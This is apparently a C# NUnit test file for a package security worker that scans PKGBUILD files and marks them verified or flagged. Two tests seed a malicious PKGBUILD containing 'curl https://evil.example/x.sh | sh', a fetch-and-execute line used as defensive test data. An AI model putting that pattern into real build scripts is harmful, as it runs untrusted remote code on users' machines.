using Atoll.Api.Services.Packages;
using Atoll.Api.Services.Security;
using Atoll.Api.Tests.Fakes;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using NUnit.Framework;
using Atoll.Api.Services.Packages.Persistence;

namespace Atoll.Api.Tests.Security;

public class PackageSecurityWorkerTests
{
    private static PackageSecurityWorker CreateWorker(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        SecurityScanStatusStore status,
        bool enabled = true)
    {
        var options = Options.Create(new AtollOptions
        {
            Security = new SecurityOptions { Enabled = enabled, ScannerConcurrency = 2, PollIntervalMs = 50 }
        });
        return new PackageSecurityWorker(
            repo, securityRepo, new PkgBuildSecurityScanner(), status, options, NullLogger<PackageSecurityWorker>.Instance);
    }

    private static async Task SeedAsync(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        string name,
        string content)
    {
        var now = DateTimeOffset.UtcNow;
        var revision = new PackageRevisionContentDocument
        {
            Id = PackageSchema.RevisionDocumentId(name, "rev-1"),
            PackageName = name,
            RevisionId = "rev-1",
            CreatedAt = now,
            Author = "test",
            Message = "seed",
            Files = new Dictionary<string, PackageFile>
            {
                ["PKGBUILD"] = new() { Content = content, Size = content.Length, Hash = "h" }
            }
        };
        await repo.InsertSeedAsync(new PackageDocument
        {
            Id = name,
            PackageName = name,
            CreatedAt = now,
            UpdatedAt = now,
            HeadRevisionId = revision.RevisionId,
            Revisions =
            [
                new PackageRevisionDocument
                {
                    RevisionId = revision.RevisionId,
                    CreatedAt = revision.CreatedAt,
                    Author = revision.Author,
                    Message = revision.Message
                }
            ]
        }, revision);
        await securityRepo.MarkPendingAsync(name, revision.RevisionId, true);
    }

    [Test]
    public async Task Clean_package_is_marked_verified()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "clean");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(scan.RevisionId, Is.EqualTo("rev-1"));
    }

    [Test]
    public async Task Malicious_package_is_marked_flagged()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Flagged));
        Assert.That(scan.Findings, Is.Not.Empty);
    }

    [Test]
    public async Task Package_seeded_after_worker_start_is_picked_up_by_polling()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
        await worker.StartAsync(CancellationToken.None);

        await SeedAsync(repo, securityRepo, "late", "pkgname=late\n");
        var scan = await WaitForScanAsync(securityRepo, "late");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public async Task Disabled_worker_does_not_scan()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), false);
        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(200);
        await worker.StopAsync(CancellationToken.None);

        Assert.That((await securityRepo.GetAsync("clean", "rev-1"))!.Status, Is.EqualTo(SecurityStatus.Pending));
    }

    [Test]
    public async Task Completed_scans_are_recorded_in_status()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var status = new SecurityScanStatusStore(true);
        var worker = CreateWorker(repo, securityRepo, status);
        await worker.StartAsync(CancellationToken.None);
        _ = await WaitForScanAsync(securityRepo, "clean");
        _ = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        var snapshot = status.GetSnapshot();
        Assert.Multiple(() =>
        {
            Assert.That(snapshot.Enabled, Is.True);
            Assert.That(snapshot.ScansCompleted, Is.EqualTo(2));
            Assert.That(snapshot.ScansVerified, Is.EqualTo(1));
            Assert.That(snapshot.ScansFlagged, Is.EqualTo(1));
            Assert.That(snapshot.ScansErrored, Is.Zero);
            Assert.That(snapshot.ScansDropped, Is.Zero);
            Assert.That(snapshot.LastScanFinishedUtc, Is.Not.Null);
        });
    }

    private static async Task<PackageSecurityScanDocument> WaitForScanAsync(
        InMemoryPackageSecurityRepository securityRepo,
        string packageName,
        int timeoutMs = 5000)
    {
        var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
        while (DateTime.UtcNow < deadline)
        {
            var scan = await securityRepo.GetAsync(packageName, "rev-1");
            if (scan?.Status is SecurityStatus.Verified or SecurityStatus.Flagged or SecurityStatus.Error)
                return scan;
            await Task.Delay(20);
        }

        Assert.Fail($"Package '{packageName}' was not scanned within {timeoutMs} ms.");
        throw new InvalidOperationException("Unreachable after assertion failure.");
    }
}